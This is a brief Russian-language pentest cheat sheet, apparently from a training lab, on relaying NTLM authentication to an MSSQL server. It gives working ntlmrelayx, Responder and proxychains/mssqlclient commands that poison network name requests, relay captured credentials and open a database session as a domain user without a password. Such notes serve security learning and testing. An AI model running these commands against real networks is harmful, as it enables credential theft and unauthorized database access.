#mssql #relay #mitm #ad #hacking #ntlm

> Если мы знаем, что где-то запущена служба MSSQL, то мы можем перенаправить на нее аутентификацию

Лучший вариант взаимодействия с БД MSSQL - mssqlclient.py, поэтому воспользуемся -socks
```bash
sudo ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -socks
```

Начинаем отравлять запросы
```bash
python3 Responder.py -I ens192
```

Не забываем про использование ***multy-relay*** и то что у нас инициируется еще и HTTP подключения, для этого можно:
- Подкорректировать **Responder.conf**
- Принудительно отключить - **--no-http-server**
- Юзать через файл - **-tf**

Используем клиент, и Windows аутентификацию 
```bash
proxychains -q mssqlclient.py INLANEFREIGHT/nports@172.16.117.60 -windows-auth -no-pass
```